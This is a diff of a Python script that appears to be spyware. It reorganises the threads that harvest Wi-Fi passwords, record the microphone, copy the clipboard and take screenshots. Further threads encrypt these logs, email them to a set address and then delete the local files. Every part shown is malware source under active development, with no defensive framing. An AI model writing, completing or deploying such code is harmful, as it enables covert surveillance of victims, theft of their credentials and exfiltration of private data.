@@ -185,8 +185,8 @@ def save_wifi_passwords():
         
         for profile, password in wifi_profiles:
             f.write(f"SSID: {profile}\nPassword: {password}\n\n")
-t3 = threading.Thread(target=save_wifi_passwords)
-t3.start()
+t2 = threading.Thread(target=save_wifi_passwords)
+t2.start()
 
 # get the microphone
 def microphone():
@@ -217,8 +217,7 @@ def encryption():
 
         with open(send_file_names[count], 'wb') as f:
             f.write(encrypted)
-        count += 1
-t6 = threading.Thread(target=encryption)    
+        count += 1   
 
 #send all the logs
 def sending_files():
@@ -226,13 +225,12 @@ def sending_files():
     for files in send_file_names:
         send_email(files, send_file_names[count], toaddr)
         count+=1
-t7 = threading.Thread(target=sending_files)
 
 #onetime log with system information
 def send_once():
     count = 0
     t1.join()
-    t3.join()
+    t2.join()
     for encrypting_file in system_files:
         with open(system_files[count], 'rb') as f:
             data = f.read()
@@ -245,8 +243,8 @@ def send_once():
     for files in encrypted_system_files:
         send_email(files, encrypted_system_files[count], toaddr)
         count+=1 
-t8 = threading.Thread(target=send_once)
-t8.start()
+t3 = threading.Thread(target=send_once)
+t3.start()
 
 number_of_iterations = 0
 currentTime = time.time()
@@ -289,7 +287,6 @@ while number_of_iterations < number_of_iterations_end:
     threads.extend([ threading.Thread(target=copy_clipboard),
                     threading.Thread(target=microphone),
                     threading.Thread(target=screenshot)])
-    
     for thread in threads:
         thread.start()
     
@@ -307,14 +304,17 @@ while number_of_iterations < number_of_iterations_end:
          
     if all(not thread.is_alive() for thread in threads):
         if not encryption_done:
-            t6.start()
+            threads.extend([threading.Thread(target=encryption)])
+            threads[-1].start()
             encryption_done = True
-        if not t6.is_alive():
-            t7.start()
+        if encryption_done : #This blocks entry until threads[3] is added then the initial if condition handles 
+            threads.extend([threading.Thread(target=sending_files)])
+            threads[-1].start()
+            encryption_done = False
                             
 
-t7.join()
-t8.join()
+threads[4].join()
+t3.join()
 delete_files =  system_files + encrypted_system_files + files_to_encrypt + send_file_names 
 for file in delete_files:
     os.remove(file)
